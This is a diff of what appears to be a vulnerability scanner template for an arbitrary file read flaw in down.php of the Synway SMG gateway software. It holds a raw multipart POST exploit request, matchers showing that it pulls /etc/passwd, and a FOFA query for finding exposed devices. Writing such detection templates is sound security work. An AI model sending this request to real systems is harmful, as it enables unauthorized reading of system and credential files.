@@ -1,23 +1,25 @@
 id: sanhui-smg-file-read
 
 info:
-  name: 三汇SMG 网关管理软件 down.php 任意文件读取漏洞
+  name: Synway SMG Gateway down.php - Arbitrary File Read
   author: SleepingBag945
   severity: high
-  description: 三汇SMG 网关管理软件 down.php文件中存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器任意文件
-  tags: sanhui-smg
+  description: |
+    There is an arbitrary file reading vulnerability in the down.php file of Synway SMG gateway management software, through which an attacker can download any file from the server.
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%B1%87SMG%20%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20down.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="text ml10 mr20" && title="网关管理软件"
+  tags: sanhui-smg,lfi,gateway
 
 http:
   - raw:
       - |
         POST /down.php HTTP/1.1
         Host: {{Hostname}}
-        Cache-Control: max-age=0
-        Upgrade-Insecure-Requests: 1
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfA9vzLuw6Gmtnmv2
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9
 
         ------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
         Content-Disposition: form-data; name="downfile"
@@ -32,15 +34,20 @@ http:
 
         ------WebKitFormBoundaryfA9vzLuw6Gmtnmv2--
 
-
     matchers-condition: and
     matchers:
       - type: regex
+        part: body
         regex:
           - "root:.*:0:0:"
-        part: body
+
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "filename=passwd"
+        condition: and
 
       - type: status
         status:
           - 200
-
